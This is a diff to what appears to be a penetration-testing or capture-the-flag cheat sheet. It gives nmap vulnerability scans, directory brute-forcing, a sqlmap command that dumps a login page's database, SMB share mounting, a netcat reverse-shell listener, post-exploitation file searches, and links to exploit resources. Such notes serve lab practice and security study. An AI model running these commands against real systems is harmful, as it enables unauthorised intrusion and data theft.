@@ -2,7 +2,7 @@
 
 $sudo nmap -Pn -A [Target_IP] -oN report-nmap.txt
 
-$sudo nmap -Pn -sV -O [Target_IP] -oN report-nmap.txt
+$sudo nmap -Pn -sV -sC -O [Target_IP] -oN report-nmap.txt
 
 $sudo nmap -Pn --script vuln [Target_IP]
 
@@ -26,13 +26,15 @@ $sudo nmap -Pn -p 21 --script ftp-vsftpd-backdoor [Target_IP] - vsFTPd 2.3.4
 
 #nmap -Pn -p 445 --script smb-vuln-* [Target_IP]
 
+https://www.exploit-db.com
+
 # 2° Scan Dirb/Gobuster
 
 $dirb http://example.com -o dirb-report.txt
 
 $gobuster -u http://example.com -x php,html,js,txt -w /usr/share/dirb/wordlists/big.txt dir
 
-# 3° Scan SQLMap
+# 3° Scan SQLMap/Burp Suite/ZAP
 
 $sqlmap -u http://Target_IP/login.php --forms --dump
 
@@ -73,6 +75,8 @@ $sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-target
 $smbclient //Target_IP/shared/dir
 
 # 6° Reverse Shell
+
+Execute no terminal shell do Kali Linux $nc -lvnp 6666
 
 php, python, nc
 
@@ -115,6 +119,10 @@ $find / -name perl* python* gcc* 2>/dev/nul
 $find /home -name flag*.txt
 
 $find / -user "www-data" -name "*" 2>/dev/null
+
+https://gtfobins.github.io
+
+https://www.exploit-db.com
 
 # 8° Deploy Payload
 
